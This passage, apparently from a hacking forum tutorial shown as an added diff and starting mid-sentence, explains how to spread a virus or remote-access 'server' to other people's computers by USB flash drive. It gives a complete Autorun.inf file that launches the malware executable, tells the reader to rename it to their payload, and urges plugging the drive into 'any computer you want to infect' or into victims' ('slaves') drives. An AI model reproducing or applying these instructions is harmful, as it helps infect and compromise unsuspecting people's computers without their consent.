@@ -1,0 +1,14 @@
+ou can make this method automatic if you browse trough your slaves files and put your virus + this .inf into their flashdrive. If you want to spread it yourself you do it the same way you just have to plug your flashdrive into any computer you want to infect.
+What you have to do is to copy and paste this code into notepad. You can remove the "ICON=1.ico" if you want to.
+
+Code
+[AutoRun]
+OPEN=server.exe
+ICON=1.ico
+ACTION=Show Menu
+LABEL=MRWECHEAT
+
+
+After you’ve pasted the code into notepad you will have to edit the line where it says "OPEN=server.exe" to "OPEN=YourFileName.exe"
+Where it says "ICON=1.ico" you will have to change the name to the name of the icon.
+Save the text file as "Autorun.inf" and put your virus + the .inf into a flashdrive and start spread your server!
